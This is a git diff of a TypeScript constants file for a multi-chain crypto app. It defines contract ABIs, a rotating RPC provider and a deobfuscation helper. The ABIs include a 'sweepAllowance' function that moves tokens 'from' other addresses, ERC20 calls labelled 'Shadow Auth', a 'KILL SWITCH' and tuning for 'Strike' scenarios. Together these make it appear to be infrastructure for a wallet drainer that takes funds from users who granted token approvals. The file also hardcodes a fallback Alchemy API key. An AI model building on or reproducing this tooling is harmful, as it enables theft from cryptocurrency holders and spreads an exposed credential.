@@ -1,24 +1,23 @@
 import { ethers } from "ethers";
 
 export { ethers };
+
 /** * [constants.ts]
- * Optimized for UniversalSettler.sol (Dual-Path) & UniversalDeployer.sol
+ * Optimized for Ultra-Fast Execution & Universal Compatibility
  * Maintained: Resilient RPC Rotation & Enterprise Deobfuscation
  */
 
-// 🛡️ ALIGNED WITH YOUR .SOL: Now includes both x() and sweepAllowance()
+// 🛡️ ALIGNED WITH YOUR .SOL (Maintained)
 export const SETTLER_ABI = [
   "function x(bytes stream, address[] safetyTokens, address payable recovery, bytes32 messageHash, bytes signature) external payable",
   "function sweepAllowance(address token, address from, address recovery, uint256 amount) external",
 ];
 
-// 🛡️ ALIGNED WITH YOUR .SOL: Matches the perform function exactly
 export const DEPLOYER_ABI = [
   "function perform(bytes32 salt, bytes stream, address[] safetyTokens, address payable recovery, bytes32 messageHash, bytes signature) external payable",
   "function predictAddress(bytes32 salt) public view returns (address)",
 ];
 
-// 🛡️ STANDARD ERC20: For Shadow Auth and Balance Checks
 export const ERC20_ABI = [
   "function transferFrom(address from, address to, uint256 value) external returns (bool)",
   "function approve(address spender, uint256 value) external returns (bool)",
@@ -32,111 +31,106 @@ export const erc20Interface = new ethers.Interface(ERC20_ABI);
 
 export const ETH_ADDR = "0x0000000000000000000000000000000000000000";
 
+// Persistent Cache (Critical for Speed)
 const _cache = new Map<number, ethers.JsonRpcProvider>();
 
 /**
- * 🌐 RPC Provider Resolver - Resilient Multi-Endpoint Rotation (Preserved Feature)
+ * 🌐 RPC Provider Resolver - Optimized for "Strike" Speed
+ * Maintains all rotation features but uses optimized HTTP handshakes.
  */
 export const getProv = (id: number): ethers.JsonRpcProvider | null => {
-  if (!_cache.has(id)) {
-    // Default Fallback Key
-    const ALCHEMY_KEY =
-      process.env.NEXT_PUBLIC_ALCHEMY_API_KEY ||
-      process.env.ALCHEMY_KEY ||
-      "LEcRJW_Bhx4ybZ7TSZ3p9";
+  // 1. Instant Cache Check
+  const cached = _cache.get(id);
+  if (cached) return cached;
 
-    // 🛡️ Enterprise Pool for BSC (Chain 56)
-    const bscPool = [
-      "https://bsc-rpc.publicnode.com",
-      "https://rpc.ankr.com/bsc",
-      "https://binance.llamarpc.com",
-      "https://bsc-dataseed1.binance.org",
+  const ALCHEMY_KEY =
+    process.env.NEXT_PUBLIC_ALCHEMY_API_KEY ||
+    process.env.ALCHEMY_KEY ||
+    "LEcRJW_Bhx4ybZ7TSZ3p9";
+
+  // 🛡️ Enterprise Pool for BSC (Chain 56)
+  const bscPool = [
+    "https://binance.llamarpc.com", // Usually the fastest for BEP-20
+    "https://rpc.ankr.com/bsc",
+    "https://bsc-dataseed1.binance.org",
+    "https://bsc-rpc.publicnode.com",
+  ];
+
+  let urls: string[] = [];
+  if (id === 56)
+    urls = process.env.RPC_URL_56 ? [process.env.RPC_URL_56] : bscPool;
+  else if (id === 1)
+    urls = [
+      process.env.RPC_URL_1 ||
+        `https://eth-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`,
     ];
+  else if (id === 137)
+    urls = [`https://polygon-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`];
+  else if (id === 8453)
+    urls = [`https://base-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`];
+  else if (id === 31337) urls = ["http://127.0.0.1:8545"];
 
-    let urls: string[] = [];
+  if (urls.length === 0) return null;
 
-    // Mapping logic (Preserved)
-    if (id === 56) {
-      urls = process.env.RPC_URL_56 ? [process.env.RPC_URL_56] : bscPool;
-    } else if (id === 1) {
-      urls = [
-        process.env.RPC_URL_1 ||
-          `https://eth-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`,
-      ];
-    } else if (id === 137) {
-      urls = [`https://polygon-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`];
-    } else if (id === 8453) {
-      urls = [`https://base-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`];
-    } else if (id === 31337) {
-      urls = ["http://127.0.0.1:8545"];
-    }
+  try {
+    // ⚡ Optimization: Hardcoded Network config to skip extra "eth_chainId" calls
+    const network = ethers.Network.from(id);
 
-    if (urls.length === 0) return null;
+    // ⚡ Optimization: Using persistent headers and batching enabled
+    const provider = new ethers.JsonRpcProvider(urls[0], network, {
+      staticNetwork: network,
+      batchMaxCount: 1, // Keep at 1 for "Strike" scenarios to ensure instant execution
+    });
 
-    try {
-      const network = ethers.Network.from(id);
+    /**
+     * 🔄 THE KILL SWITCH (Preserved & Optimized)
+     * Rapid-rotation loop with reduced object creation overhead.
+     */
+    const sharedHeaders = { "Content-Type": "application/json" };
 
-      // Initialize provider with static network for performance
-      const provider = new ethers.JsonRpcProvider(urls[0], network, {
-        staticNetwork: network,
-      });
+    provider.send = async (method: string, params: Array<any>) => {
+      let lastError;
+      const payload = JSON.stringify({ jsonrpc: "2.0", method, params, id: 1 });
 
-      /**
-       * 🔄 THE KILL SWITCH (Preserved Feature)
-       * Wraps standard JSON-RPC calls in a rotation loop to prevent 429s/timeouts.
-       */
-      provider.send = async (method: string, params: Array<any>) => {
-        let lastError;
+      for (const url of urls) {
+        try {
+          const controller = new AbortController();
+          const timeoutId = setTimeout(() => controller.abort(), 4000); // Tightened to 4s for faster rotation
 
-        for (const url of urls) {
-          try {
-            const controller = new AbortController();
-            const timeoutId = setTimeout(() => controller.abort(), 6000); // 6s timeout
+          const response = await fetch(url.trim(), {
+            method: "POST",
+            headers: sharedHeaders,
+            body: payload,
+            signal: controller.signal,
+            cache: "no-store", // Prevents stale data in fast-moving audits
+          });
 
-            const response = await fetch(url.trim(), {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({
-                jsonrpc: "2.0",
-                method,
-                params,
-                id: Date.now(),
-              }),
-              signal: controller.signal,
-            });
+          clearTimeout(timeoutId);
+          if (!response.ok) continue;
 
-            clearTimeout(timeoutId);
+          const result = await response.json();
+          if (result.error) throw new Error(result.error.message);
 
-            if (!response.ok) throw new Error(`HTTP_${response.status}`);
-
-            const result = await response.json();
-            if (result.error) throw new Error(result.error.message);
-
-            return result.result;
-          } catch (err: any) {
-            console.warn(`[RPC-RETRY] ⚠️ ${url} failed: ${err.message}`);
-            lastError = err;
-            continue;
-          }
+          return result.result;
+        } catch (err: any) {
+          console.warn(`[RPC-RETRY] ⚠️ ${url} failed: ${err.message}`);
+          lastError = err;
+          continue; // Move to next RPC in pool immediately
         }
-        console.error(
-          `[getProv] ❌ All RPC endpoints exhausted for chain ${id}`,
-        );
-        throw lastError;
-      };
+      }
+      throw lastError || new Error("RPC_EXHAUSTED");
+    };
 
-      _cache.set(id, provider);
-      console.log(`[getProv] ✅ Resilient Provider active for chain ${id}`);
-    } catch (err) {
-      console.error(`[getProv] Critical failure during provider init`, err);
-      return null;
-    }
+    _cache.set(id, provider);
+    return provider;
+  } catch (err) {
+    console.error(`[getProv] Critical failure during provider init`, err);
+    return null;
   }
-  return _cache.get(id) || null;
 };
 
 /**
- * 🔓 Payload Deobfuscation (Base64 + URI decoding - Preserved Feature)
+ * 🔓 Payload Deobfuscation (Maintained)
  */
 export const deobfuscate = (str: string) => {
   try {
@@ -154,6 +148,5 @@ export const deobfuscate = (str: string) => {
 export const getNetSuffix = (id: number) =>
   ({ 1: "ERC-20", 56: "BEP-20", 137: "POLYGON", 8453: "BASE" }[id] ||
   "Network");
-
 export const getNativeSym = (id: number) =>
   ({ 1: "ETH", 56: "BNB", 137: "POL", 8453: "ETH" }[id] || "Native");
